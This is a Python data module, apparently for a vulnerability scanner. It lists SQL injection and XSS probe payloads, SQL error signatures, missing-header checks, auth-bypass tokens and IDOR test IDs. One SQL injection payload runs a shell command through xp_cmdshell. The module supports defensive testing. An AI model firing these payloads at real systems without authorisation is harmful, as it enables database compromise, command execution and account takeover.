"""
Security Testing Payloads and Signatures for Member 2 Vulnerability Scanner
"""

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT 1, 'admin', 'pass' --",
    '" OR ""="',
    "1' ORDER BY 1--",
    "'; EXEC xp_cmdshell('dir');--"
]

SQLI_ERROR_SIGNATURES = [
    "syntax error",
    "sqlite3.operationalerror",
    "unrecognized token",
    "mysql_fetch_array",
    "you have an error in your sql syntax",
    "warning: mysql",
    "pg_query(): query failed",
    "ora-01756",
    "microsoft ole db provider for odbc drivers",
    "unclosed quotation mark after the character string",
    "postgresql query failed"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    '"><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//",
    "<svg/onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">"
]

COMMON_SECURITY_HEADERS = [
    {
        "name": "Strict-Transport-Security",
        "severity": "Medium",
        "cwe": "CWE-319",
        "description": "Missing HSTS allows unencrypted HTTP connections and man-in-the-middle attacks."
    },
    {
        "name": "Content-Security-Policy",
        "severity": "Medium",
        "cwe": "CWE-1021",
        "description": "Missing CSP increases exposure to cross-site scripting (XSS) and data injection attacks."
    },
    {
        "name": "X-Frame-Options",
        "severity": "Low",
        "cwe": "CWE-1021",
        "description": "Missing X-Frame-Options allows clickjacking attacks via iframe embedding."
    },
    {
        "name": "X-Content-Type-Options",
        "severity": "Low",
        "cwe": "CWE-79",
        "description": "Missing X-Content-Type-Options (nosniff) permits MIME-sniffing exploits."
    }
]

AUTH_BYPASS_TOKENS = [
    None,                           # Missing header completely
    "",                             # Empty Authorization header
    "Bearer invalid_dummy_token_999", # Tampered token
    "Bearer null",
    "Basic YWRtaW46YWRtaW4="        # admin:admin
]

IDOR_TEST_IDS = [
    "101",
    "102",
    "103",
    "admin",
    "1",
    "9999"
]
